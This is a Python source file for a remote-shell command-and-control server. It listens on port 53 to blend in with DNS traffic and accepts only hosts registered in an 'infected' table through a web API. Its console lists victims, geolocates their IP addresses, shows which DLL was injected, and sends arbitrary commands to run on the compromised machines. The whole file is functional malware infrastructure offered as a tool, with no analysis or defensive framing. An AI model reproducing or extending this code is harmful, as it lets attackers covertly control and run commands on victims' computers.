from datetime import datetime
import base64
import json
import socket
import sys
import os
import threading
import requests
import readline

# Used for web api
APIKEY = "Yq5GYNwzLcZVe9iHiWEbQVVtv6W44hGZvsCUVXVWmZkh6Mru8qFTEToVndDkZ5LH"

# Holds the connected clients
clients = {}

# Holds the logged events
logs = []

# Flag for knowing when the thread printed something
flag = False


# Exception that is thrown when an unknown host attempts to connect
class UnknownHostException(Exception):
    pass


# Function used to log events
def log(event):
    tf = "[%d/%m/%Y - %H:%M:%S]"
    logs.append(f"{datetime.now().strftime(tf)} {event}")


# Function used to close a given socket properly
def close_socket(sock):
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


# Threaded function that receives data from a client and prints the output
def receive_from_client(c, addr, host):
    global clients, logs, flag

    while True:
        try:
            # If we get a packet, we read its 4 first bytes, which represent the size of the full message
            size = c.recv(4)

            # If we get an empty message, it means that the client has disconnected, so we raise an exception
            if not size:
                raise socket.error

            # Getting the message size as an integer
            size = int.from_bytes(size, "big")

            # Byte array that will receive the full message later
            message = bytearray()

            # While the length of the byte array doesn't match the message size, keep appending received data to it
            while len(message) < size:
                message += c.recv(1024)

            # Decoding the message
            message = base64.b64decode(message)
            message = message.decode("utf-8")

            # Printing the message to console
            print(message)

            # Setting the flag to True to tell our main program that we have completed our job
            flag = True

        # If the output cannot be decoded, print an error instead
        except UnicodeDecodeError:
            print("Unable to decode output.")

        # If the client is disconnected, remove it from "clients"
        except socket.error:
            log(f"Client \"{host}\" ({addr}) disconnected from the server.")
            clients.pop(addr)
            break


# Threaded function that accepts foreign connections
def accept_clients(server):
    global clients, logs
    while True:
        # Receiving TCP connection
        c, addr = server.accept()

        # Formatting the full address properly
        faddr = ":".join([str(e) for e in addr])

        try:
            # Receiving JSON with computer name from client
            host = c.recv(1024).decode("utf-8")

            # Attempting to parse JSON
            h = json.loads(host)

            # If JSON has no key "host", throw exception
            if h["host"] is None:
                raise UnknownHostException

            host = h["host"]

            # Fetching JSON data from "infected" table for the specified host
            response = requests.get(f"http://localhost/webapi.php?key={APIKEY}&ipv4={addr[0]}&host={host}")
            d = json.loads(response.text)

            # If the webapi returned "error", it means that the host is unknown
            if d["status"] == "error":
                raise UnknownHostException

            # At this point, we are accepting the connection, so we log the event
            log(f"Client \"{host}\" ({faddr}) connected to the server.")

            # Storing the client socket, also launching a thread for printing received output
            clients[faddr] = (d, c, threading.Thread(target=receive_from_client, args=(c, faddr, host)))
            clients[faddr][2].start()

        except (UnicodeDecodeError, json.decoder.JSONDecodeError, UnknownHostException):
            log(f"Refused connection from {faddr} (UnicodeDecodeError).")
            close_socket(c)


if __name__ == "__main__":
    # Creating TCP server, listening on port 53
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 53))
    s.listen(5)

    # Launching a thread to start accepting client connections
    t = threading.Thread(target=accept_clients, args=(s,))
    t.daemon = True
    t.start()

    print("[+] Server started.")
    selected = None

    # Below is our own CLI for interacting with clients
    while True:
        name = clients[selected][0]['data']['host'] if selected else "none"
        command = input(f"rshell@[{name}]$ ")
        cmd = command.split()

        # If we entered a command in the prompt
        if command:
            # If we type "exit" or "quit", close all sockets before exiting
            if command in ["exit", "quit"]:
                for client in clients.values():
                    close_socket(client[1])
                sys.exit("[+] Server shutdown.")

            # If we type "clients", print all available clients with a corresponding ID
            if command == "clients":
                if clients:
                    for i, (k, v) in enumerate(clients.items()):
                        print(f" [ID {i}] {v[0]['data']['host']} from {k.split(':')[0]}")
                else:
                    print("[+] No clients available right now.")

            # If we type "clear", clear the screen
            if command in ["clear", "cls"]:
                os.system("clear")

            # If we type "logs", print all the logged events
            if command == "logs":
                if logs:
                    for ev in logs:
                        print(ev)
                else:
                    print("[+] No logs to show.")

            # If we type "clean", clean the logs
            if command == "clean":
                logs.clear()
                print("[+] Logs have been cleaned.")

            # If we type "unselect", unselect the selected client
            if command in ["unselect", "deselected"]:
                selected = None
                print(f"[+] {name} has been deselected.")

            # Commands below require arguments
            if len(cmd) > 1:
                # If we type "sel" or "select" with a valid ID next to it, select the corresponding client
                if cmd[0] in ["sel", "select"]:
                    try:
                        # Selecting the corresponding client from the dictionary
                        selected = list(clients.keys())[int(cmd[1])]

                        # Getting the data array
                        data = clients[selected][0]["data"]

                        # Getting IP location
                        try:
                            req = requests.get(f"http://ip-api.com/json/{data['ip']}")
                            ip_info = json.loads(req.text)
                            location = f"{ip_info['city']}, {ip_info['country']}"
                        except (KeyError, requests.exceptions.RequestException, json.decoder.JSONDecodeError):
                            location = "Unknown country"

                        # Printing client info
                        print(f"\n[+] Selected client : {data['host']}")
                        print(f"[+] IP address : {data['ip']} ({location})")
                        print(f"[+] Operating system : {data['os']}")
                        print(f"[+] DLL injected : {data['latest_load']}\n")

                    except (ValueError, KeyError, IndexError):
                        print(f"[+] Invalid ID selected. Type \"clients\" to show available clients.")

                # If we type "r" or "run" with a command next to it, send it to the selected client
                if cmd[0] in ["r", "run"]:
                    if selected is not None:
                        # Building command, appending null terminator
                        cmd_to_run = " ".join(cmd[1:]) + "\0"

                        # Sending the command
                        clients[selected][1].send(cmd_to_run.encode("utf-8"))

                        # Waiting for the thread to print the output
                        while not flag:
                            pass

                        # Setting the flag back to False
                        flag = False
                    else:
                        print("[+] You need to select a client first. Type \"clients\" to show available clients.")

        # If the selected host is unknown (it was removed by the thread), then unselect it
        if selected and selected not in clients.keys():
            print(f"[+] Client \"{name}\" closed the connection.")
            selected = None
